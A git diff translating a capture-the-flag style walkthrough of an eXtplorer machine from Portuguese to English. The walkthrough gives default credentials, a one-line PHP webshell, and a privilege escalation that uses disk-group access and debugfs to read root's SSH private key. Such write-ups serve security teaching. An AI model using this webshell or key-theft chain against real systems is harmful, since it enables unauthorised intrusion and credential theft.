@@ -1,42 +1,42 @@
 # Extplorer
 > eXtplorer file manager + grupo disk
 
-## Enumeração
+## Enumeration
 
 ```
 nmap -sC -sV -oN nmap.txt <IP>
 ```
 
-eXtplorer (gerenciador de arquivos web) identificado.
+eXtplorer (web file manager) identified.
 
-## Exploração
+## Exploitation
 
-Credenciais padrão ou fracas no eXtplorer:
+Default or weak credentials on eXtplorer:
 
 ```
 admin:admin
 admin:extplorer
 ```
 
-File manager com upload permitido → webshell enviada.
+File manager with upload allowed → webshell uploaded.
 
 ```
 # shell.php
 <?php system($_GET['cmd']); ?>
 ```
 
-Reverse shell como www-data.
+Reverse shell as www-data.
 
-## Escalada de Privilégio
+## Privilege Escalation
 
-Usuário pertence ao grupo `disk`:
+User belongs to the `disk` group:
 
 ```
 id
 # uid=33(www-data) gid=33(www-data) groups=33(www-data),6(disk)
 ```
 
-Leitura direta do disco como root:
+Direct disk read as root:
 
 ```
 df -h
@@ -45,9 +45,9 @@ debugfs: cat /root/.ssh/id_rsa
 ```
 
 ```
-# salvar chave e conectar
+# save key and connect
 chmod 600 id_rsa
 ssh -i id_rsa root@<IP>
 ```
 
-Root obtido.
+Root obtained.
